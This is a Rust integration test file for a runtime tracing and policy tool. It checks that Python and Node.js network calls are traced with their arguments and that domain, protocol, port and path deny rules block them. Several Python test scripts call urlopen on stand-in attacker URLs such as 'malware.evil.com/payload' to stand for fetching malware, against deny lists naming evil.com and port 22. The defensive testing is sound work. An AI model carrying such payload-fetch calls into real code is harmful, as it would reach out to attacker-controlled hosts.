//! HTTP tracing integration tests.
//!
//! Verifies that HTTP library calls are traced with correct argument formatting
//! (URL, method, domain visible in output), and that networking policy rules
//! evaluate correctly against HTTP trace events.

use crate::common::*;
use crate::skip_if_no_node_primary;
use crate::skip_if_no_python_primary;

fn setup() {
    build_fixtures();
}

// ============================================================================
// Python HTTP Tracing — Argument Formatting
// ============================================================================

#[test]
fn test_python_http_client_request_shows_method_and_url() {
    setup();

    // http.client class method tracing works on 3.10+ via get_class_name_from_self fallback.
    skip_if_no_python_primary!(python => {
        let script = r#"
import http.client
try:
    conn = http.client.HTTPConnection('127.0.0.1', 1, timeout=0.1)
    conn.request('GET', '/test-path')
except Exception:
    pass
"#;
        let output = cmd(&format!("x --py http.client.HTTPConnection.__init__ --py http.client.HTTPConnection.request -- {} -c {}",
                python.display(), sq(script)))
            .run();

        let stdout = output.stdout();

        // Should trace HTTPConnection.__init__ with host argument
        assert!(
            stdout.contains("[malwi] http.client.HTTPConnection.__init__([Object], host='127.0.0.1'"),
            "Expected http.client.HTTPConnection.__init__([Object], host='127.0.0.1'...). stdout: {}",
            stdout
        );

        // Source location should reference the inline script
        assert!(
            stdout.contains("<eval>:"),
            "Expected <eval> source location. stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_python_urllib_urlopen_shows_url() {
    setup();

    skip_if_no_python_primary!(python => {
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://127.0.0.1:1/test-urllib', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x --py urllib.request.urlopen -- {} -c {}", python.display(), sq(script)))
            .run();

        let stdout = output.stdout();

        // Should capture the urlopen call with arguments (fully qualified name)
        assert!(
            stdout.contains("[malwi] urllib.request.urlopen("),
            "Expected [malwi] urllib.request.urlopen( trace with args. stdout: {}",
            stdout
        );

        // On Python 3.10+, verify URL argument is formatted
        let version = get_python_minor_version(&python);
        if version.map(|v| v >= 10).unwrap_or(false) {
            assert!(
                stdout.contains("127.0.0.1:1/test-urllib"),
                "Expected 127.0.0.1:1/test-urllib in urlopen arguments (Python 3.10+). stdout: {}",
                stdout
            );
        }

        // Source location should reference the inline script
        assert!(
            stdout.contains("<eval>:"),
            "Expected <eval> source location. stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_python_socket_connect_shows_address() {
    setup();

    skip_if_no_python_primary!(python => {
        let script = r#"
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.1)
    s.connect(('127.0.0.1', 1))
except Exception:
    pass
"#;
        let output = cmd(&format!("x --py socket.socket --py socket.connect -- {} -c {}", python.display(), sq(script)))
            .run();

        let stdout = output.stdout();

        // socket.connect should be traced with address arguments
        assert!(
            stdout.contains("[malwi] socket.connect("),
            "Expected [malwi] socket.connect( trace with args. stdout: {}",
            stdout
        );

        // On Python 3.10+, verify connect shows the formatted address
        let version = get_python_minor_version(&python);
        if version.map(|v| v >= 10).unwrap_or(false) {
            assert!(
                stdout.contains("address=('127.0.0.1', 1)"),
                "Expected address=('127.0.0.1', 1) in socket.connect args (Python 3.10+). stdout: {}",
                stdout
            );
        }

        // Source location should reference the inline script
        assert!(
            stdout.contains("<eval>:"),
            "Expected <eval> source location. stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Node.js HTTP Tracing — Argument Capture
// ============================================================================

#[test]
fn test_nodejs_http_request_traced() {
    setup();

    skip_if_no_node_primary!(node => {
        let script = r#"
const http = require('http');
const req = http.request('http://127.0.0.1:1/test-path', () => {});
req.on('error', () => {});
req.end();
req.destroy();
"#;
        let output = cmd(&format!("x --js http.request -- {} -e {}", node.display(), sq(script)))
            .run();

        let stdout = output.stdout();

        // Should capture http.request call with URL argument and source
        assert!(
            stdout.contains("[malwi] http.request("),
            "Expected [malwi] http.request( trace with args. stdout: {}",
            stdout
        );
        assert!(
            stdout.contains("127.0.0.1:1/test-path"),
            "Expected 127.0.0.1:1/test-path in http.request arguments. stdout: {}",
            stdout
        );
        // Source location: addon-traced functions use get_top_source_location
        // to capture the caller's location. The caller here is the -e eval script.
        assert!(
            stdout.contains("[eval]:1:"),
            "Expected [eval]:1: source location for addon-traced http.request. stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Networking Tests — Domain Deny
// ============================================================================

#[test]
fn test_policy_domain_deny_blocks_python_http_to_evil_domain() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
python:
  deny:
    - "urllib.request.urlopen"
network:
  deny:
    - "*.evil.com"
"#);

        // Call urlopen with an evil domain — should trigger both function deny
        // and domain deny
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://malware.evil.com/payload', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        // Should show a denied message for the function with URL
        assert!(
            stdout.contains("denied: urllib.request.urlopen(url='http://malware.evil.com/payload'"),
            "Expected denied: urllib.request.urlopen(url='http://malware.evil.com/payload'...). stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_policy_domain_deny_flags_allowed_function_with_evil_domain() {
    setup();

    skip_if_no_python_primary!(python => {
        // Function is NOT denied, but domain IS denied.
        // The networking policy should still flag it.
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*.evil.com"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://download.evil.com/malware', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        // The function itself is denied by python section, with URL args
        assert!(
            stdout.contains("denied: urllib.request.urlopen(url='http://download.evil.com/malware'"),
            "Expected denied: urllib.request.urlopen(url='http://download.evil.com/malware'...). stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Networking Tests — Protocol Enforcement
// ============================================================================

#[test]
fn test_policy_protocol_only_https_denies_http_call() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  protocols: [https]
python:
  deny:
    - "urllib.request.urlopen"
"#);

        // HTTP URL — protocol "http" not in allowed list
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://example.com/insecure', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        // Should be flagged (either by function deny or protocol deny) with URL
        assert!(
            stdout.contains("denied: urllib.request.urlopen(url='http://example.com/insecure'"),
            "Expected denied: urllib.request.urlopen(url='http://example.com/insecure'...). stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Networking Tests — Endpoint Enforcement
// ============================================================================

#[test]
fn test_policy_endpoint_deny_blocks_specific_port() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*:22"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        // URL targeting port 22 — should be denied
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://example.com:22/ssh-tunnel', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        assert!(
            stdout.contains("denied: urllib.request.urlopen(url='http://example.com:22/ssh-tunnel'"),
            "Expected denied: urllib.request.urlopen(url='http://example.com:22/ssh-tunnel'...). stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + HTTP URL Pattern Rules
// ============================================================================

#[test]
fn test_policy_http_url_deny_pattern_blocks_evil_domain() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*.evil.com/**"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://malware.evil.com/payload', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        // Should be denied by function policy (and http URL policy too) with URL
        assert!(
            stdout.contains("denied: urllib.request.urlopen(url='http://malware.evil.com/payload'"),
            "Expected denied: urllib.request.urlopen(url='http://malware.evil.com/payload'...). stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_policy_http_url_deny_path_blocks_admin() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "**/admin/**"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://127.0.0.1:1/admin/secret', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        assert!(
            stdout.contains("denied: urllib.request.urlopen(url='http://127.0.0.1:1/admin/secret'"),
            "Expected denied: urllib.request.urlopen(url='http://127.0.0.1:1/admin/secret'...). stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_policy_http_url_deny_http_scheme_allows_https() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  warn:
    - "http://**"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        // HTTP URL — should be denied by http URL pattern
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://127.0.0.1:1/insecure', timeout=0.1)
except Exception:
    pass
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        // Should show denied (function deny hits first) with URL
        assert!(
            stdout.contains("denied: urllib.request.urlopen(url='http://127.0.0.1:1/insecure'"),
            "Expected denied: urllib.request.urlopen(url='http://127.0.0.1:1/insecure'...). stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Raw Socket Endpoint Deny (via structured NetworkInfo)
// ============================================================================

/// Verify that raw socket.connect() calls are blocked by endpoint deny policy.
///
/// Before NetworkInfo, socket.connect() arguments like "address=('host', 6379)"
/// were not parsed by the text-based URL extractor, so endpoint policies silently
/// skipped them. Now the agent populates NetworkInfo with host+port, and the CLI
/// evaluates it directly.
#[test]
fn test_policy_endpoint_deny_blocks_raw_socket_connect() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*:6379"
python:
  deny:
    - "socket.connect"
"#);

        // socket.connect to port 6379 — should be denied via endpoint policy
        let script = r#"
import socket
import time
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 6379))
except Exception:
    pass
time.sleep(0.5)
"#;
        let output = cmd(&format!("x -p {} -- {} -c {}", policy_path.display(), python.display(), sq(script)))
            .timeout(secs(10)).run();

        let _ = std::fs::remove_file(&policy_path);

        let stdout = output.stdout();

        assert!(
            stdout.contains("denied: socket.connect([Object], address=('127.0.0.1', 6379))"),
            "Expected denied: socket.connect([Object], address=('127.0.0.1', 6379)). stdout: {}",
            stdout
        );
    });
}
